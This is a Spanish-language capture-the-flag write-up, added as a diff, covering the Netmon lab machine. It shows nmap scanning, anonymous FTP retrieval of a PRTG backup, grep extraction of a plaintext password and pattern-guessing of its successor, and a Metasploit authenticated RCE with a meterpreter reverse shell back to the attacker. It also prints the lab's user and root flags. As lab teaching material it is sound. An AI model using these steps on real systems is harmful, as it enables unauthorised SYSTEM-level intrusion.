@@ -1,0 +1,66 @@
+#Resumen Ejecutivo:
+
+Netmon es una máquina Windows que destaca la importancia de la higiene en los servicios de transferencia de archivos y la gestión de backups. 
+La intrusión se logra mediante la explotación de una configuración predeterminada en el servicio FTP y la reutilización/deducción de credenciales 
+en el software de monitoreo **PRTG Network Monitor**.
+
+Fase de Reconocimiento
+
+### Escaneo de Puertos (Nmap)
+Se realizó un escaneo inicial para identificar servicios activos:
+
+nmap -sV -sC -Pn 10.129.39.80 -oN scans/nmap_init.txt
+
+Puertos abiertos detectados:
+
+21 (FTP): Microsoft ftpd (Anonymous login allowed).
+
+80 (HTTP): PRTG Network Monitor.
+
+445 (SMB): Microsoft Windows DS.
+
+Enumeración y Acceso Inicial:
+
+Explotación de FTP Anónimo
+Al acceder al servicio FTP sin credenciales, se identificó la estructura de archivos de Windows. Tras navegar por las rutas de aplicación,
+se localizó un archivo de backup crítico en: C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak
+
+Análisis de Credenciales:
+
+Utilizando herramientas de filtrado de texto, se extrajeron credenciales del archivo XML:
+
+grep -iC 5 "dbpassword" "PRTG Configuration.old.bak"
+Credencial encontrada: PrTg@dmin2018
+
+Debido a la fecha del backup, se aplicó una técnica de deducción de patrones, probando el año correlativo (PrTg@dmin2019), logrando acceso exitoso al panel de administración web.
+
+Explotación (RCE):
+Con acceso administrativo al panel de PRTG, se procedió a utilizar el framework Metasploit para obtener una shell reversa.
+
+Módulo: exploit/windows/http/prtg_authenticated_rce
+
+Payload: windows/x64/meterpreter/reverse_tcp
+
+Configuración:
+
+set ADMIN_USERNAME prtgadmin
+
+set ADMIN_PASSWORD PrTg@dmin2019
+
+set LHOST [TUN0_IP]
+
+El exploit crea una notificación maliciosa en el servidor que ejecuta código PowerShell, devolviendo una sesión con privilegios de NT AUTHORITY\SYSTEM.
+
+Post-Explotación
+
+Una vez obtenida la sesión de Meterpreter, se procedió a la lectura de los archivos de flag:
+
+User Flag: b7c7697054f850566befc07ad47e424f
+
+Root Flag: 890aea0fb4bc624280dec18d7c53b1cf
+
+Conclusiones:
+
+Vulnerabilidad: Exposición de archivos sensibles vía FTP y debilidad en la política de rotación de contraseñas.
+
+Mitigación: Deshabilitar el acceso FTP anónimo y asegurar que los archivos de configuración con credenciales en texto claro tengan permisos de lectura restringidos.
